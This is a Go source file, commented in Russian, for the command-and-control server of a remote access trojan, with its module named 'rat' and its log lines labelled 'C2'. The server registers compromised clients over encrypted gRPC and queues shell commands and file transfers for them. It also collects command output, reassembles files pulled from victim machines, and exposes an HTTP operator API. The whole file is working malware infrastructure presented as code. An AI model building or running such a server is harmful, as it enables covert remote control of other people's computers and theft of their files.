package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"

	"rat/internal/crypto"
	pb "rat/internal/proto"

	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/protobuf/proto"
)

// объявление сессии с клиентом
type ClientSession struct {
	SessionKey  []byte                   // ключ сессии
	Hostname    string                   // имя клиента
	OS          string                   // ОС клиента
	LastSeen    time.Time                // время последней проверки клиента
	TaskQueue   chan *pb.Task            // канал с заданиями
	FileBuffers map[string]*bytes.Buffer // мапа с файлами
}

var (
	clients = make(map[string]*ClientSession) // мапа клиентов
	mu      sync.RWMutex                      // мьютекс для мапы
	cmdLogs []string                          // логи
	logsMu  sync.Mutex                        // мьютекс логов
)

type server struct {
	pb.UnimplementedClientServiceServer
}

// функция регистрации нового клиента
func (s *server) Register(cntx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponce, error) {
	privKey, pubKey, err := crypto.GenKeyPair() // приватный и публичный ключи
	if err != nil {
		return nil, err // если возникла ошибка создания ключей, то возвращаем ее
	}
	sharedKey, err := crypto.GetAESKey(privKey, req.PublicKey) // создаем ключ сессии
	if err != nil {
		log.Printf("[!!!] Key exchange failed for %s", req.ClientId) // если ошибка, то пишем в логах
		return nil, err
	}

	mu.Lock() // мьютим запись клиентов, чтобы добавить нового клиента в мапу
	clients[req.ClientId] = &ClientSession{
		SessionKey:  sharedKey,
		Hostname:    req.Hostname,
		OS:          req.Os,
		LastSeen:    time.Now().Local(),
		TaskQueue:   make(chan *pb.Task, 50),
		FileBuffers: make(map[string]*bytes.Buffer),
	}
	mu.Unlock()                                                          // снимаем мьют
	log.Printf("Client registered: %s (%s)", req.Hostname, req.ClientId) // пишем в логах о новом клиенте
	return &pb.RegisterResponce{PublicKey: pubKey}, nil
}

// функция получения задания клиентом
func (s *server) GetTask(cntx context.Context, req *pb.PollRequest) (*pb.TaskEnvelope, error) {
	mu.RLock()
	session, ok := clients[req.ClientId] // получаем айди сессии
	mu.RUnlock()
	if !ok {
		return &pb.TaskEnvelope{}, nil
	}
	mu.Lock()
	session.LastSeen = time.Now().Local() // меняем время последнего просмотра клиента
	mu.Unlock()
	select {
	case task := <-session.TaskQueue: // достаем из канала задание
		data, err := proto.Marshal(task) // сериализуем
		if err != nil {
			log.Printf("[!!!] Marshal error: %v", err) // если ошибка сериализации, то возвращаем ее
			return nil, err
		}
		enc, initV, err := crypto.Encrypt(data, session.SessionKey) // шифруем таску для клиента
		if err != nil {
			return nil, err
		}
		log.Printf("Send task %s to %s", task.Type, req.ClientId) // логируем отправку таски
		return &pb.TaskEnvelope{EncryptedData: enc, InitV: initV}, nil
	case <-time.After(time.Second):
		return &pb.TaskEnvelope{}, nil // если заданий нет, то ждем одну секунду и возвращаем пустой ответ
	}
}

// функция чтения результата
func (s *server) SendResult(stream pb.ClientService_SendResultServer) error {
	for {
		envelope, err := stream.Recv()
		if err == io.EOF {
			return stream.SendAndClose(&pb.Empty{})
		}
		if err != nil {
			return err
		}
		mu.RLock()
		session, ok := clients[envelope.ClientId] // получаем сессию
		mu.RUnlock()
		if !ok {
			continue
		}
		data, err := crypto.Decrypt(envelope.EncryptedData, envelope.InitV, session.SessionKey) // дешифруем полученные данные
		if err != nil {
			log.Printf("[!!!] Decrypt error from %s", envelope.ClientId) // пишем в логах, если ошибка дешифрования
			continue
		}
		var res pb.TaskResult
		if err := proto.Unmarshal(data, &res); err != nil { // десериализуем данные
			continue
		}
		if res.FileName != "" {
			handleFileChunk(session, &res) // если в полученных данных есть название файла, то должна произойти его загрузка => вызываем функцию загрузки чанка файла
		} else {
			log.Printf("Result from %s:\n %s", envelope.ClientId, res.Output) // в противном случае мы получаем текстовый ответ => выводим его в логи
			if res.Error != "" {
				log.Printf("Error from %s:\n %s", envelope.ClientId, res.Error)
			}
			logsAppend(res.Command, res.TaskId, res.Output, res.Error)
		}
	}
}

// функция добавления логов для каждой команды
func logsAppend(command, taskId, output, cmdError string) {
	logsMu.Lock()
	defer logsMu.Unlock()
	timestamp := time.Now().UTC().Add(3 * time.Hour).Format("02-01-2006 15:04:05")
	entry := fmt.Sprintf("[%s] %s (%s)\n", timestamp, command, taskId)
	if output != "" {
		entry += "\n" + output
	}
	if cmdError != "" {
		entry += "\nError: " + cmdError
	}
	cmdLogs = append(cmdLogs, entry)
}

// функция загрузки файла
func handleFileChunk(session *ClientSession, res *pb.TaskResult) {
	mu.Lock()
	defer mu.Unlock()
	if _, exists := session.FileBuffers[res.TaskId]; !exists {
		session.FileBuffers[res.TaskId] = new(bytes.Buffer) // создаем буфер для первого чанка
	}
	session.FileBuffers[res.TaskId].Write(res.FileChunk) // дописываем данные чанка в бфер
	// когда встречен последний чанк
	if res.IsLast {
		finalData := session.FileBuffers[res.TaskId].Bytes()               // собираем все содержимое файла
		os.MkdirAll("download", 0755)                                      // создаем на сервере директорию загрузок, если не было
		savePath := filepath.Join("download", filepath.Base(res.FileName)) // определяем место для сохранения (download + название_файла)
		os.WriteFile(savePath, finalData, 0644)                            // записываем в файл
		log.Printf("File %s saved", savePath)                              // пишем в логах о сохранении файлов
		logsAppend("Download "+res.FileName, res.TaskId, "saved", "")
		delete(session.FileBuffers, res.TaskId) // очищаем буфер для таски
	}
}

// функция получения клиентов за последние 30 секунд
func apiClients(w http.ResponseWriter, r *http.Request) {
	mu.RLock()
	defer mu.RUnlock()
	list := []interface{}{}
	now := time.Now()
	// смотрим актуальную мапу клиентов
	for id, s := range clients {
		// если со времени последней проверки прошло меньше 30 секунд, то добавляем клиента в слайс
		if now.Sub(s.LastSeen) < 30*time.Second {
			list = append(list, map[string]interface{}{
				"id":        id,
				"hostname":  s.Hostname,
				"os":        s.OS,
				"last_seen": s.LastSeen,
			})
		}
	}
	json.NewEncoder(w).Encode(list) // в жсон
}

// функция получения тасков
func apiTask(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	var req struct {
		Type     string `json:"type"`
		Cmd      string `json:"command"`
		Path     string `json:"path"`
		FileName string `json:"file_name"`
		FileData []byte `json:"file_data"`
	}
	json.NewDecoder(r.Body).Decode(&req) // получаем таску
	mu.RLock()
	session, ok := clients[id] // получаем сессию, для которой создана таска
	mu.RUnlock()
	if !ok {
		http.Error(w, "offline", 404) // обработка случая, когда клиент не зарегистрирован
		return
	}
	// читаем таску
	task := &pb.Task{
		TaskId:   uuid.New().String(),
		Type:     req.Type,
		Command:  req.Cmd,
		FilePath: req.Path,
		FileName: req.FileName,
		FileData: req.FileData,
	}
	session.TaskQueue <- task                                                                // отправляем таску в канал тасок для конкретной сессии
	json.NewEncoder(w).Encode(map[string]string{"status": "queued", "task_id": task.TaskId}) // в жсон
}

// список загрузок
func apiListDownload(w http.ResponseWriter, r *http.Request) {
	files, err := os.ReadDir("download") // читаем директорию с загрузками
	if err != nil {
		json.NewEncoder(w).Encode([]string{})
		return
	}
	var list []string
	for _, f := range files {
		if !f.IsDir() {
			list = append(list, f.Name()) // проходимся по директории и добавляем в слайс имена файлов
		}
	}
	json.NewEncoder(w).Encode(list) // в жсон
}

// получаем логи
func apiGetLogs(w http.ResponseWriter, r *http.Request) {
	logsMu.Lock()
	defer logsMu.Unlock()
	json.NewEncoder(w).Encode(cmdLogs)
}

// удаление неактивных клиентов
func cleanupInactiveClients() {
	mu.Lock()
	defer mu.Unlock()
	now := time.Now()
	for id, session := range clients {
		// если клиент не проверялся больше двух минут, то он удаляется вместе с принадлежащими ему тасками
		if now.Sub(session.LastSeen) > 2*time.Minute {
			log.Printf("Removing inactive client: %s (%s)", session.Hostname, id)
			close(session.TaskQueue)
			delete(clients, id)
		}
	}
}

func main() {
	// слушаем grpc в отдельной горутине
	go func() {
		listen, _ := net.Listen("tcp", ":50051")
		s := grpc.NewServer()
		pb.RegisterClientServiceServer(s, &server{})
		log.Println("C2 gRPC on :50051")
		s.Serve(listen)
	}()
	// проверяем неактивных клиентов в отдельной горутине
	go func() {
		ticker := time.NewTicker(time.Minute)
		for range ticker.C {
			cleanupInactiveClients()
		}
	}()
	// обертка над http-запросами, чтобы запросы с :8080 приходили к :8081
	corsHandler := func(next http.HandlerFunc) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Access-Control-Allow-Origin", "*")
			w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
			w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
			if r.Method == "OPTIONS" {
				w.WriteHeader(http.StatusOK)
				return
			}
			next(w, r)
		}
	}

	// слушаем http
	http.HandleFunc("/api/download", corsHandler(apiListDownload))
	http.Handle("/download/", http.StripPrefix("/download/", http.FileServer(http.Dir("download"))))
	http.HandleFunc("/api/clients", corsHandler(apiClients))
	http.HandleFunc("/api/task", corsHandler(apiTask))
	http.HandleFunc("/api/logs", corsHandler(apiGetLogs))
	log.Println("C2 API on :8081")
	http.ListenAndServe(":8081", nil)
}
